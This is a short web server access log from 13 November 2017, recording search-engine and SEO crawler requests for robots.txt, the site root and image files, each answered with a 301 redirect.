66.249.79.133 - - [13/Nov/2017:07:01:57 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [13/Nov/2017:07:01:58 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.157 - - [13/Nov/2017:07:02:49 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
216.244.66.233 - - [13/Nov/2017:07:20:41 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:07:29:05 -0800] "GET /img/wu-wei/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
145.239.89.243 - - [13/Nov/2017:07:42:39 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
216.244.66.233 - - [13/Nov/2017:10:22:20 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:10:28:33 -0800] "GET /img/mixman/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
217.182.132.75 - - [13/Nov/2017:10:54:17 -0800] "GET /img/mixman/18.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
207.46.13.164 - - [13/Nov/2017:11:00:23 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
46.229.164.99 - - [13/Nov/2017:12:11:27 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
216.244.66.233 - - [13/Nov/2017:12:19:53 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [13/Nov/2017:12:29:49 -0800] "GET /img/mixman/5.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
206.180.165.147 - - [13/Nov/2017:15:13:24 -0800] "GET / HTTP/1.1" 301 235 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
180.76.15.19 - - [13/Nov/2017:15:21:32 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
